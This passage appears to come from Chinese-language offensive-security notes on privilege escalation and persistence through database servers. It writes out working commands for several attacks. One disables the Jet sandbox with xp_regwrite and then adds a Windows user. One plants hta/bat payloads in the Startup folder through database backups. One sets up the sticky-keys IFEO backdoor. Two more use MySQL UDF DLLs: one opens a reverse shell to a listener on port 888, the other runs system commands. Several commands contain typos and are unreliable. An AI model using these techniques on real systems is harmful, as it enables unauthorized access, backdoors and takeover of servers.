- SP_OACreate 或SP_OAMETHOD 被删除或改名。

## 沙盒模式
为了安全微软在jet引擎的sp8中，设置了一个名为 SandBoxMode 的开关，这个开关开启一些特殊函数在另外的
执行者中执行权限：
沙盒模式是一种安全功能，在这种模式下，access只对控件和字段属性中的安全且不含恶意代码的表达式求值。
我们把值改成0的时候就开启了沙盒，从而可以执行相关的函数。
```
//默认值 2
HKEY_LOCAL_MACHINE\SoftWare\Microsoft\Jet\4.0\Engine\SandBoxMode
/**
0 任何所有者都禁止启用安全模式；
1 仅在允许的范围内；
2 必须在access的模式下；
3 完全开启（连access 也不支持）
**/ 
```
```
exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE\SoftWare','SoftWare\Microsoft\Jet\4.0\Engine\','SandBoxMode','REG_DWORD',0
# 上面语句执行成功 后，就可以执行系统命令了：
select * from openRowSet('Microsoft.Jet.OLEDB.4.0',';DataBase=c:\windows\system32\ias\ias.mdb','select shell("net user test 123456 /add")')
```
`iad.mdb`是win2003 ,如果目标主机为win2002则文件名为`ias.mdb`

## 尝试备份 bat、hta文件到启动目录
建立一个表，写入名利，备份数据库到 "C:\Documents and Settings\All Users\[开始]菜单\程序\启动" 目录，
文件后缀为bat或 hta,这样用户登录系统时就会启动我们备份的batho hta文件。
```
// log 备份
alter database 库名 set RECOVERY FULL--
create table cmd (a image)--
backup log 库名 to disk='c:\hta' with init --
insert into cmd(a) values ('要执行的命令') --
backup log 库名 to disk 'C:\Documents and Settings\All Users\[开始]菜单\程序\启动\hello.hta' --
drop table cmd --

//差异备份
backup database 库名 to disk='c:\database.bck' --
create table cmd (cmd image) --
insert into cmd(cmd) values ('执行的命令')--
backup database 库名 to disk = C:\Documents and Settings\All Users\[开始]菜单\程序\启动\hello.hta' with diffeREnTial Format --
drop table cmd --
```

把要执行的名利转换成十六进制，执行效率会高些

### 映像劫持 IFEO- image file execution options
位于注册表`HKEY_LOCAL_MACHINE\SoftWare\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`
最关键的是这个键值下有一个 `Debugger`, 它是IFEO里第一个被处理的参数。作用是：
- 系统发现某个程序文件在IFEO列表中，它就会首先读取 Debugger参数，如果为不为空，系统则会把debugger参数里指定的程序文件名作为用户试图启动程序执行请求来处理！
微软想通过Debugger 参数让程序员能够通过双击程序文件直接进入调试器里面调试自己的程序，
可如果我们把这里的程序替换成其他的[如cmd.exe],就可以达到使用系统名利的效果了。
```
exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SoftWare\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','debuger','REG_SZ','c:\\windows\\exeplorer.exe'
```
当我们远程桌面后，按五次shift 就会出现服务器薄面了，虽然这个时候我们没有登录账号，但还是可以使用任何程序，只不过一段时间后连接会断掉，我们尽快加个系统账号

## mix.dll
1.121 为mysql服务器，1.203 为本机，首先用mysql.exe 连接，然后到处 mix.txt,
```
\. c:\mix.txt 
```
这个时候在使用 'select Mixconnect('192.168.1.203','888');',反弹一个shell，然后本机用nc监听 888这个端口；
```
nc -vv -l -p 888
```
令人遗憾的是，用mix.dll 提权经常会导致服务器的mysql.exe 出现假死状态，这样给我们的连接带来了一些意想不到的情况。
udf.dll 提权就不会产生这样的情况。
##udf.dll
首先利用 "select * from mysql.user;"来确保这台机器是不是有读文件的权限，如果没有，那我们只能放弃。
```
mysql -uroot -p
> .\ c:\udf.txt
> create function cmdshell returns string soname 'udf.dll'; 
```
如果出现错误可能的原因生生成的udf.dll 被当木马被服务器上的杀毒软件杀掉了；或者
是文件的最后几行为：
```
use mysql;
create table sgl(data longBlog);
insert into sgl values ("");
update sgl set data=@a;
select data from sgl into dumpfile 'c:\\windows\\system32\\udf.dll';
drop table sgl;
```
也就是说，如果服务器为win2000，这个路径是错误的，可依据情况修改变为：
`select data from sgl into DUMPFILE 'c:\\winnt\\system32\\udf.dll';`
执行成功后！
```
>select cmdshell<'net user'>;
```
这个是直接在命令行下执行命令，而不需要我们在本地监听端口，部分mysql.exe的版本，
也不会出现mysql.exe假死的可能。
